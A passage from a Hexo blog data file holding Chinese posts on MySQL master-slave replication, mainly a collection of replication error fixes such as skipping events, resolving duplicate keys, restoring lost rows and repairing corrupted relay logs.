class=\"line\">                  Master_User: mastj  </span><br><span class=\"line\">                  Master_Port: 3306  </span><br><span class=\"line\">                Connect_Retry: 10  </span><br><span class=\"line\">              Master_Log_File: mysql-bin.000003  </span><br><span class=\"line\">          Read_Master_Log_Pos: 2369  </span><br><span class=\"line\">               Relay_Log_File: jhq0113-relay-bin.000002  </span><br><span class=\"line\">                Relay_Log_Pos: 647  </span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000003  </span><br><span class=\"line\">             Slave_IO_Running: Yes  </span><br><span class=\"line\">            Slave_SQL_Running: Yes  </span><br><span class=\"line\">            ...</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x82E5;Slave_IO_Running&#x548C;Slave_SQL_Running&#x5747;&#x4E3A;Yes&#xFF0C;&#x5219;&#x8868;&#x793A;&#x914D;&#x7F6E;&#x6210;&#x529F;&#x3002;</strong></p>\n<hr>\n<h2 id=\"MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;\"><a href=\"#MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;\" class=\"headerlink\" title=\"MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;\"></a>MySQL&#x590D;&#x5236;&#x8FC7;&#x7A0B;</h2><p>MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;&#x4E3B;&#x8981;&#x7531;&#x4E09;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B8C;&#x6210;&#xFF0C;&#x5176;&#x4E2D;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;(Sql&#x7EBF;&#x7A0B;&#x548C;IO&#x7EBF;&#x7A0B;)&#x5728;Slave&#x7AEF;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;(IO&#x7EBF;&#x7A0B;)&#x5728;Master&#x7AEF;&#x3002;</p>\n<ul>\n<li>Slave &#x4E0A;&#x9762;&#x7684;IO&#x7EBF;&#x7A0B;&#x8FDE;&#x63A5;&#x4E0A; Master&#xFF0C;&#x5E76;&#x8BF7;&#x6C42;&#x4ECE;&#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;(&#x6216;&#x8005;&#x4ECE;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x65E5;&#x5FD7;)&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#xFF1B;</li>\n<li>Master &#x63A5;&#x6536;&#x5230;&#x6765;&#x81EA; Slave &#x7684; IO &#x7EBF;&#x7A0B;&#x7684;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x8D1F;&#x8D23;&#x590D;&#x5236;&#x7684; IO &#x7EBF;&#x7A0B;&#x6839;&#x636E;&#x8BF7;&#x6C42;&#x4FE1;&#x606F;&#x8BFB;&#x53D6;&#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED9; Slave &#x7AEF;&#x7684; IO &#x7EBF;&#x7A0B;&#x3002;&#x8FD4;&#x56DE;&#x4FE1;&#x606F;&#x4E2D;&#x9664;&#x4E86;&#x65E5;&#x5FD7;&#x6240;&#x5305;&#x542B;&#x7684;&#x4FE1;&#x606F;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x5305;&#x62EC;&#x672C;&#x6B21;&#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x5728; Master &#x7AEF;&#x7684; Binary Log &#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x5728; Binary Log &#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#xFF1B;</li>\n<li>Slave &#x7684; IO &#x7EBF;&#x7A0B;&#x63A5;&#x6536;&#x5230;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x5C06;&#x63A5;&#x6536;&#x5230;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x5230; Slave &#x7AEF;&#x7684;Relay Log&#x6587;&#x4EF6;(mysql-relay-bin.xxxxxx)&#x7684;&#x6700;&#x672B;&#x7AEF;&#xFF0C;&#x5E76;&#x5C06;&#x8BFB;&#x53D6;&#x5230;&#x7684;Master&#x7AEF;&#x7684;bin-log&#x7684;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x4F4D;&#x7F6E;&#x8BB0;&#x5F55;&#x5230;master- info&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x4E0B;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x7684;&#x65F6;&#x5019;&#x80FD;&#x591F;&#x6E05;&#x695A;&#x7684;&#x9AD8;&#x901F;Master&#x201C;&#x6211;&#x9700;&#x8981;&#x4ECE;&#x67D0;&#x4E2A;bin-log&#x7684;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x5F80;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#xFF0C;&#x8BF7;&#x53D1;&#x7ED9;&#x6211;&#x201D;</li>\n<li>Slave &#x7684; SQL &#x7EBF;&#x7A0B;&#x68C0;&#x6D4B;&#x5230; Relay Log &#x4E2D;&#x65B0;&#x589E;&#x52A0;&#x4E86;&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x4F1A;&#x9A6C;&#x4E0A;&#x89E3;&#x6790;&#x8BE5; Log &#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x6210;&#x4E3A;&#x5728; Master &#x7AEF;&#x771F;&#x5B9E;&#x6267;&#x884C;&#x65F6;&#x5019;&#x7684;&#x90A3;&#x4E9B;&#x53EF;&#x6267;&#x884C;&#x7684; Query &#x8BED;&#x53E5;&#xFF0C;&#x5E76;&#x5728;&#x81EA;&#x8EAB;&#x6267;&#x884C;&#x8FD9;&#x4E9B; Query&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x5728; Master &#x7AEF;&#x548C; Slave &#x7AEF;&#x6267;&#x884C;&#x4E86;&#x540C;&#x6837;&#x7684; Query&#xFF0C;&#x6240;&#x4EE5;&#x4E24;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x7684;&#x3002;</li>\n</ul>\n<hr>\n<h2 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h2><p><strong>my.cnf&#x53C2;&#x6570;&#x8BE6;&#x89E3;</strong><br><a href=\"https://my.oschina.net/eduosi/blog/270535\">https://my.oschina.net/eduosi/blog/270535</a></p>\n<p><strong><font style=\"color:red\">&#x7EBF;&#x4E0A;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x62A5;&#x9519;&#x6545;&#x969C;&#x5904;&#x7406;&#x603B;&#x7ED3;</font></strong><br><a href=\"http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html\">http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html</a></p>\n<p><strong>Mysql&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x7684;&#x590D;&#x5236;&#x539F;&#x7406;</strong><br><a href=\"http://blog.csdn.net/hguisu/article/details/7325124\">http://blog.csdn.net/hguisu/article/details/7325124</a></p>\n<p><strong>&#x4E0D;&#x540C;&#x573A;&#x666F;&#x4E0B; MySQL &#x7684;&#x8FC1;&#x79FB;&#x65B9;&#x6848;</strong><br><a href=\"https://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes\">https://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes</a></p>\n<p><br></p>"},{"title":"MySQL同步报错故障处理集锦","date":"2016-10-20T13:18:00.000Z","toc":false,"_content":"\n### 前言\n在发生故障切换后，经常遇到的问题就是同步报错，下面是最近收集的报错信息。\n\n\n---\n\n### 删除失败\n**在master上删除一条记录，而slave上找不到**\n```bash\nLast_SQL_Error: Could not execute Delete_rows event on table hcy.t1; \nCan't find record in 't1', \nError_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; \nthe event's master log mysql-bin.000006, end_log_pos 254\n```\n\n解决方法：master要删除一条记录，而slave上找不到报错，这种情况主都已经删除了，那么从机可以直接跳过。\n```bash\nstop slave;\nset global sql_slave_skip_counter=1;\nstart slave;\n```\n如果这种情况很多，需要针对这种错误专门写相关脚本。\n\n<!-- more -->\n\n---\n\n\n### 主键重复\n在slave已经有该记录，又在master上插入了同一条记录。\n```bash\nLast_SQL_Error: Could not execute Write_rows event on table hcy.t1; \nDuplicate entry '2' for key 'PRIMARY', \nError_code: 1062; \nhandler error HA_ERR_FOUND_DUPP_KEY; the event's master log mysql-bin.000006, end_log_pos 924\n```\n解决方法：\n\n在slave上用desc hcy.t1; 先看下表结构：\n```bash\nmysql> desc hcy.t1;\n+-------+---------+------+-----+---------+-------+\n| Field | Type    | Null | Key | Default | Extra |\n+-------+---------+------+-----+---------+-------+\n| id    | int(11) | NO   | PRI | 0       |       | \n| name  | char(4) | YES  |     | NULL    |       | \n+-------+---------+------+-----+---------+-------+\n```\n删除重复的主键\n```bash\nmysql> delete from t1 where id=2;\nQuery OK, 1 row affected (0.00 sec)\n\nmysql> start slave;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> show slave status\\G;\n……\nSlave_IO_Running: Yes\nSlave_SQL_Running: Yes\n……\nmysql> select * from t1 where id=2;\n```\n在master上和slave上再分别确认一下。\n\n\n---\n\n\n### 更新丢失\n在master上更新一条记录，而slave上找不到，丢失了数据。\n```bash\nLast_SQL_Error: Could not execute Update_rows event on table hcy.t1; \nCan't find record in 't1', \nError_code: 1032; \nhandler error HA_ERR_KEY_NOT_FOUND; \nthe event's master log mysql-bin.000010, end_log_pos 794\n```\n解决方法：\n\n在master上，用mysqlbinlog 分析下出错的binlog日志在干什么。\n```bash\n/usr/local/mysql/bin/mysqlbinlog --no-defaults -v -v --base64-output=DECODE-ROWS mysql-bin.000010 | grep -A '10' 794\n\n#120302 12:08:36 server id 22  end_log_pos 794  Update_rows: table id 33 flags: STMT_END_F\n### UPDATE hcy.t1\n### WHERE\n###   @1=2 /* INT meta=0 nullable=0 is_null=0 */\n###   @2='bbc' /* STRING(4) meta=65028 nullable=1 is_null=0 */\n### SET\n###   @1=2 /* INT meta=0 nullable=0 is_null=0 */\n###   @2='BTV' /* STRING(4) meta=65028 nullable=1 is_null=0 */\n# at 794\n#120302 12:08:36 server id 22  end_log_pos 821  Xid = 60\nCOMMIT/*!*/;\nDELIMITER ;\n# End of log file\nROLLBACK /* added by mysqlbinlog */;\n/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;\n```\n\n在slave上，查找下更新后的那条记录，应该是不存在的。\n```bash\nmysql> select * from t1 where id=2;\nEmpty set (0.00 sec)\n```\n然后再到master查看\n```bash\nmysql> select * from t1 where id=2;\n+----+------+\n| id | name |\n+----+------+\n|  2 | BTV  | \n+----+------+\n1 row in set (0.00 sec)\n```\n把丢失的数据在slave上填补，然后跳过报错即可。\n```bash\nmysql> insert into t1 values (2,'BTV');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql> select * from t1 where id=2;    \n+----+------+\n| id | name |\n+----+------+\n|  2 | BTV  | \n+----+------+\n1 row in set (0.00 sec)\n\nmysql> stop slave ;set global sql_slave_skip_counter=1;start slave;\nQuery OK, 0 rows affected (0.01 sec)\nQuery OK, 0 rows affected (0.00 sec)\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> show slave status\\G;\n……\n Slave_IO_Running: Yes\n Slave_SQL_Running: Yes\n……\n```\n\n\n---\n\n\n### 中继日志损坏\nslave的中继日志relay-bin损坏。\n```bash\nLast_SQL_Error: Error initializing relay log position: I/O error reading the header from the binary log\nLast_SQL_Error: Error initializing relay log position: Binlog has bad magic number;  \nIt's not a binary log file that can be used by  this version of MySQL\n```\n\n#### 1、手工修复\n解决方法：找到同步的binlog和POS点，然后重新做同步，这样就可以有新的中继日值了。\n\n例子：\n```bash\nmysql> show slave status\\G;\n*************************** 1. row ***************************\n              Master_Log_File: mysql-bin.000010\n          Read_Master_Log_Pos: 1191\n               Relay_Log_File: vm02-relay-bin.000005\n                Relay_Log_Pos: 253\n        Relay_Master_Log_File: mysql-bin.000010\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: No\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n           Replicate_Do_Table: \n       Replicate_Ignore_Table: \n      Replicate_Wild_Do_Table: \n  Replicate_Wild_Ignore_Table: \n                   Last_Errno: 1593\n                   Last_Error: Error initializing relay log position: I/O error reading the header from the binary log\n                 Skip_Counter: 1\n          Exec_Master_Log_Pos: 821\n\nSlave_IO_Running ：接收master的binlog信息\n                   Master_Log_File\n                   Read_Master_Log_Pos\n\nSlave_SQL_Running：执行写操作\n                   Relay_Master_Log_File\n                   Exec_Master_Log_Pos\n```\n\n以执行写的binlog和POS点为准。\n```bash\nRelay_Master_Log_File: mysql-bin.000010\nExec_Master_Log_Pos: 821\n```\n\n```bash\nmysql> stop slave;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000010',MASTER_LOG_POS=821;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> start slave;\nQuery OK, 0 rows affected (0.00 sec)\n\n\nmysql> show slave status\\G;\n*************************** 1. row ***************************\n               Slave_IO_State: Waiting for master to send event\n                  Master_Host: 192.168.8.22\n                  Master_User: repl\n                  Master_Port: 3306\n                Connect_Retry: 10\n              Master_Log_File: mysql-bin.000010\n          Read_Master_Log_Pos: 1191\n               Relay_Log_File: vm02-relay-bin.000002\n                Relay_Log_Pos: 623\n        Relay_Master_Log_File: mysql-bin.000010\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n           Replicate_Do_Table: \n       Replicate_Ignore_Table: \n      Replicate_Wild_Do_Table: \n  Replicate_Wild_Ignore_Table: \n                   Last_Errno: 0\n                   Last_Error: \n                 Skip_Counter: 0\n          Exec_Master_Log_Pos: 1191\n              Relay_Log_Space: 778\n              Until_Condition: None\n               Until_Log_File: \n                Until_Log_Pos: 0\n           Master_SSL_Allowed: No\n           Master_SSL_CA_File: \n           Master_SSL_CA_Path: \n              Master_SSL_Cert: \n            Master_SSL_Cipher: \n               Master_SSL_Key: \n        Seconds_Behind_Master: 0\nMaster_SSL_Verify_Server_Cert: No\n                Last_IO_Errno: 0\n                Last_IO_Error: \n               Last_SQL_Errno: 0\n               Last_SQL_Error: \n```\n\n#### 2、Ibbackup\n各种大招都用上了，无奈slave数据丢失过多，ibbackup（需要银子）该你登场了。\n\nIbbackup热备份工具，是付费的。xtrabackup是免费的，功能上一样。\n\nIbbackup备份期间不锁表，备份时开启一个事务（相当于做一个快照），然后会记录一个点，之后数据的更改保存在ibbackup_logfile文件里，恢复时把ibbackup_logfile 变化的数据再写入到ibdata里。\n\nIbbackup 只备份数据（ ibdata、.ibd ），表结构.frm不备份。\n\n","source":"_posts/MySQL同步报错故障处理集锦.md","raw":"---\ntitle: MySQL同步报错故障处理集锦\ncategories:\n  - 错误集锦\ntags:\n  - mysql\ndate: 2016-10-20 21:18:00\ntoc: false\n---\n\n### 前言\n在发生故障切换后，经常遇到的问题就是同步报错，下面是最近收集的报错信息。\n\n\n---\n\n### 删除失败\n**在master上删除一条记录，而slave上找不到**\n```bash\nLast_SQL_Error: Could not execute Delete_rows event on table hcy.t1; \nCan't find record in 't1', \nError_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; \nthe event's master log mysql-bin.000006, end_log_pos 254\n```\n\n解决方法：master要删除一条记录，而slave上找不到报错，这种情况主都已经删除了，那么从机可以直接跳过。\n```bash\nstop slave;\nset global sql_slave_skip_counter=1;\nstart slave;\n```\n如果这种情况很多，需要针对这种错误专门写相关脚本。\n\n<!-- more -->\n\n---\n\n\n### 主键重复\n在slave已经有该记录，又在master上插入了同一条记录。\n```bash\nLast_SQL_Error: Could not execute Write_rows event on table hcy.t1; \nDuplicate entry '2' for key 'PRIMARY', \nError_code: 1062; \nhandler error HA_ERR_FOUND_DUPP_KEY; the event's master log mysql-bin.000006, end_log_pos 924\n```\n解决方法：\n\n在slave上用desc hcy.t1; 先看下表结构：\n```bash\nmysql> desc hcy.t1;\n+-------+---------+------+-----+---------+-------+\n| Field | Type    | Null | Key | Default | Extra |\n+-------+---------+------+-----+---------+-------+\n| id    | int(11) | NO   | PRI | 0       |       | \n| name  | char(4) | YES  |     | NULL    |       | \n+-------+---------+------+-----+---------+-------+\n```\n删除重复的主键\n```bash\nmysql> delete from t1 where id=2;\nQuery OK, 1 row affected (0.00 sec)\n\nmysql> start slave;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> show slave status\\G;\n……\nSlave_IO_Running: Yes\nSlave_SQL_Running: Yes\n……\nmysql> select * from t1 where id=2;\n```\n在master上和slave上再分别确认一下。\n\n\n---\n\n\n### 更新丢失\n在master上更新一条记录，而slave上找不到，丢失了数据。\n```bash\nLast_SQL_Error: Could not execute Update_rows event on table hcy.t1; \nCan't find record in 't1', \nError_code: 1032; \nhandler error HA_ERR_KEY_NOT_FOUND; \nthe event's master log mysql-bin.000010, end_log_pos 794\n```\n解决方法：\n\n在master上，用mysqlbinlog 分析下出错的binlog日志在干什么。\n```bash\n/usr/local/mysql/bin/mysqlbinlog --no-defaults -v -v --base64-output=DECODE-ROWS mysql-bin.000010 | grep -A '10' 794\n\n#120302 12:08:36 server id 22  end_log_pos 794  Update_rows: table id 33 flags: STMT_END_F\n### UPDATE hcy.t1\n### WHERE\n###   @1=2 /* INT meta=0 nullable=0 is_null=0 */\n###   @2='bbc' /* STRING(4) meta=65028 nullable=1 is_null=0 */\n### SET\n###   @1=2 /* INT meta=0 nullable=0 is_null=0 */\n###   @2='BTV' /* STRING(4) meta=65028 nullable=1 is_null=0 */\n# at 794\n#120302 12:08:36 server id 22  end_log_pos 821  Xid = 60\nCOMMIT/*!*/;\nDELIMITER ;\n# End of log file\nROLLBACK /* added by mysqlbinlog */;\n/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;\n```\n\n在slave上，查找下更新后的那条记录，应该是不存在的。\n```bash\nmysql> select * from t1 where id=2;\nEmpty set (0.00 sec)\n```\n然后再到master查看\n```bash\nmysql> select * from t1 where id=2;\n+----+------+\n| id | name |\n+----+------+\n|  2 | BTV  | \n+----+------+\n1 row in set (0.00 sec)\n```\n把丢失的数据在slave上填补，然后跳过报错即可。\n```bash\nmysql> insert into t1 values (2,'BTV');\nQuery OK, 1 row affected (0.00 sec)\n\nmysql> select * from t1 where id=2;    \n+----+------+\n| id | name |\n+----+------+\n|  2 | BTV  | \n+----+------+\n1 row in set (0.00 sec)\n\nmysql> stop slave ;set global sql_slave_skip_counter=1;start slave;\nQuery OK, 0 rows affected (0.01 sec)\nQuery OK, 0 rows affected (0.00 sec)\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> show slave status\\G;\n……\n Slave_IO_Running: Yes\n Slave_SQL_Running: Yes\n……\n```\n\n\n---\n\n\n### 中继日志损坏\nslave的中继日志relay-bin损坏。\n```bash\nLast_SQL_Error: Error initializing relay log position: I/O error reading the header from the binary log\nLast_SQL_Error: Error initializing relay log position: Binlog has bad magic number;  \nIt's not a binary log file that can be used by  this version of MySQL\n```\n\n#### 1、手工修复\n解决方法：找到同步的binlog和POS点，然后重新做同步，这样就可以有新的中继日值了。\n\n例子：\n```bash\nmysql> show slave status\\G;\n*************************** 1. row ***************************\n              Master_Log_File: mysql-bin.000010\n          Read_Master_Log_Pos: 1191\n               Relay_Log_File: vm02-relay-bin.000005\n                Relay_Log_Pos: 253\n        Relay_Master_Log_File: mysql-bin.000010\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: No\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n           Replicate_Do_Table: \n       Replicate_Ignore_Table: \n      Replicate_Wild_Do_Table: \n  Replicate_Wild_Ignore_Table: \n                   Last_Errno: 1593\n                   Last_Error: Error initializing relay log position: I/O error reading the header from the binary log\n                 Skip_Counter: 1\n          Exec_Master_Log_Pos: 821\n\nSlave_IO_Running ：接收master的binlog信息\n                   Master_Log_File\n                   Read_Master_Log_Pos\n\nSlave_SQL_Running：执行写操作\n                   Relay_Master_Log_File\n                   Exec_Master_Log_Pos\n```\n\n以执行写的binlog和POS点为准。\n```bash\nRelay_Master_Log_File: mysql-bin.000010\nExec_Master_Log_Pos: 821\n```\n\n```bash\nmysql> stop slave;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000010',MASTER_LOG_POS=821;\nQuery OK, 0 rows affected (0.01 sec)\n\nmysql> start slave;\nQuery OK, 0 rows affected (0.00 sec)\n\n\nmysql> show slave status\\G;\n*************************** 1. row ***************************\n               Slave_IO_State: Waiting for master to send event\n                  Master_Host: 192.168.8.22\n                  Master_User: repl\n                  Master_Port: 3306\n                Connect_Retry: 10\n              Master_Log_File: mysql-bin.000010\n          Read_Master_Log_Pos: 1191\n               Relay_Log_File: vm02-relay-bin.000002\n                Relay_Log_Pos: 623\n        Relay_Master_Log_File: mysql-bin.000010\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: Yes\n              Replicate_Do_DB: \n          Replicate_Ignore_DB: \n           Replicate_Do_Table: \n       Replicate_Ignore_Table: \n      Replicate_Wild_Do_Table: \n  Replicate_Wild_Ignore_Table: \n                   Last_Errno: 0\n                   Last_Error: \n                 Skip_Counter: 0\n          Exec_Master_Log_Pos: 1191\n              Relay_Log_Space: 778\n              Until_Condition: None\n               Until_Log_File: \n                Until_Log_Pos: 0\n           Master_SSL_Allowed: No\n           Master_SSL_CA_File: \n           Master_SSL_CA_Path: \n              Master_SSL_Cert: \n            Master_SSL_Cipher: \n               Master_SSL_Key: \n        Seconds_Behind_Master: 0\nMaster_SSL_Verify_Server_Cert: No\n                Last_IO_Errno: 0\n                Last_IO_Error: \n               Last_SQL_Errno: 0\n               Last_SQL_Error: \n```\n\n#### 2、Ibbackup\n各种大招都用上了，无奈slave数据丢失过多，ibbackup（需要银子）该你登场了。\n\nIbbackup热备份工具，是付费的。xtrabackup是免费的，功能上一样。\n\nIbbackup备份期间不锁表，备份时开启一个事务（相当于做一个快照），然后会记录一个点，之后数据的更改保存在ibbackup_logfile文件里，恢复时把ibbackup_logfile 变化的数据再写入到ibdata里。\n\nIbbackup 只备份数据（ ibdata、.ibd ），表结构.frm不备份。\n\n","slug":"MySQL同步报错故障处理集锦","published":1,"updated":"2016-11-17T11:59:42.667Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbo001mgwtm0qq47k2c","content":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>&#x5728;&#x53D1;&#x751F;&#x6545;&#x969C;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x7ECF;&#x5E38;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x540C;&#x6B65;&#x62A5;&#x9519;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x8FD1;&#x6536;&#x96C6;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002;</p>\n<hr>\n<h3 id=\"&#x5220;&#x9664;&#x5931;&#x8D25;\"><a href=\"#&#x5220;&#x9664;&#x5931;&#x8D25;\" class=\"headerlink\" title=\"&#x5220;&#x9664;&#x5931;&#x8D25;\"></a>&#x5220;&#x9664;&#x5931;&#x8D25;</h3><p><strong>&#x5728;master&#x4E0A;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Could not execute Delete_rows event on table hcy.t1; </span><br><span class=\"line\">Can<span class=\"string\">&apos;t find record in &apos;</span>t1<span class=\"string\">&apos;, </span><br><span class=\"line\">Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; </span><br><span class=\"line\">the event&apos;</span>s master <span class=\"built_in\">log</span> mysql-bin.000006, end_<span class=\"built_in\">log</span>_pos 254</span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;master&#x8981;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#x62A5;&#x9519;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E3B;&#x90FD;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">stop slave;</span><br><span class=\"line\"><span class=\"built_in\">set</span> global sql_slave_skip_counter=1;</span><br><span class=\"line\">start slave;</span><br></pre></td></tr></table></figure></p>\n<p>&#x5982;&#x679C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5F88;&#x591A;&#xFF0C;&#x9700;&#x8981;&#x9488;&#x5BF9;&#x8FD9;&#x79CD;&#x9519;&#x8BEF;&#x4E13;&#x95E8;&#x5199;&#x76F8;&#x5173;&#x811A;&#x672C;&#x3002;</p>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"&#x4E3B;&#x952E;&#x91CD;&#x590D;\"><a href=\"#&#x4E3B;&#x952E;&#x91CD;&#x590D;\" class=\"headerlink\" title=\"&#x4E3B;&#x952E;&#x91CD;&#x590D;\"></a>&#x4E3B;&#x952E;&#x91CD;&#x590D;</h3><p>&#x5728;slave&#x5DF2;&#x7ECF;&#x6709;&#x8BE5;&#x8BB0;&#x5F55;&#xFF0C;&#x53C8;&#x5728;master&#x4E0A;&#x63D2;&#x5165;&#x4E86;&#x540C;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Last_SQL_Error: Could not execute Write_rows event on table hcy.t1; </span><br><span class=\"line\">Duplicate entry <span class=\"string\">&apos;2&apos;</span> <span class=\"keyword\">for</span> key <span class=\"string\">&apos;PRIMARY&apos;</span>, </span><br><span class=\"line\">Error_code: 1062; </span><br><span class=\"line\">handler error HA_ERR_FOUND_DUPP_KEY; the event<span class=\"string\">&apos;s master log mysql-bin.000006, end_log_pos 924</span></span><br></pre></td></tr></table></figure></p>\n<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;</p>\n<p>&#x5728;slave&#x4E0A;&#x7528;desc hcy.t1; &#x5148;&#x770B;&#x4E0B;&#x8868;&#x7ED3;&#x6784;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; desc hcy.t1;</span><br><span class=\"line\">+-------+---------+------+-----+---------+-------+</span><br><span class=\"line\">| Field | Type    | Null | Key | Default | Extra |</span><br><span class=\"line\">+-------+---------+------+-----+---------+-------+</span><br><span class=\"line\">| id    | int(11) | NO   | PRI | 0       |       | </span><br><span class=\"line\">| name  | char(4) | YES  |     | NULL    |       | </span><br><span class=\"line\">+-------+---------+------+-----+---------+-------+</span><br></pre></td></tr></table></figure></p>\n<p>&#x5220;&#x9664;&#x91CD;&#x590D;&#x7684;&#x4E3B;&#x952E;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; delete from t1 <span class=\"built_in\">where</span> id=2;</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; start 